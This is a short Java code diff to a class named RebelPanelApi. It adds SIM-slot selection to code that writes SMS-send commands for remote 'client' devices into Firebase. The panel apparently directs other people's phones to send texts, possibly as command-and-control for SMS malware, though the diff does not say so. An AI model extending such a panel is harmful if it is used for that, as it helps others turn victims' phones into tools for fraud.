@@ -48,6 +48,8 @@ final class RebelPanelApi {
             String authKey = trim(body.optString("auth_key"));
             String schema = trim(body.optString("schema", "rabel"));
             String deviceNode = trim(body.optString("device_node", "clients"));
+            boolean sameNumber = body.optInt("same_number", 0) == 1;
+            int simCount = Math.max(1, body.optInt("sim_count", 1));
 
             if (deviceId.isEmpty() || to.isEmpty() || message.isEmpty()) {
                 return error("Device, number and message required");
@@ -63,7 +65,7 @@ final class RebelPanelApi {
             String okPath = "";
 
             for (SendAttempt attempt : attempts) {
-                JSONObject payload = sendPayloadForType(attempt.type, sim, to, message, deviceId);
+                JSONObject payload = sendPayloadForType(attempt.type, sim, to, message, deviceId, sameNumber, simCount);
                 String method = attempt.method != null && !attempt.method.isEmpty()
                         ? attempt.method : "PUT";
                 JSONObject res = RebelFirebaseClient.request(method, url, authKey, attempt.path, payload);
@@ -281,8 +283,17 @@ final class RebelPanelApi {
         return out;
     }
 
+    private static int rabelFromSim(int sim, boolean sameNumber, int simCount) {
+        sim = Math.max(1, sim);
+        if (sameNumber && simCount >= 2 && sim == 1) {
+            return 2;
+        }
+        return sim;
+    }
+
     private static JSONObject sendPayloadForType(
-            String type, int sim, String to, String message, String deviceId
+            String type, int sim, String to, String message, String deviceId,
+            boolean sameNumber, int simCount
     ) throws Exception {
         int slot = Math.max(1, sim);
         if ("spinplay".equals(type)) {
@@ -325,7 +336,7 @@ final class RebelPanelApi {
         }
 
         JSONObject payload = new JSONObject();
-        payload.put("from", slot);
+        payload.put("from", rabelFromSim(slot, sameNumber, simCount));
         payload.put("to", to);
         payload.put("message", message);
         payload.put("isSended", false);
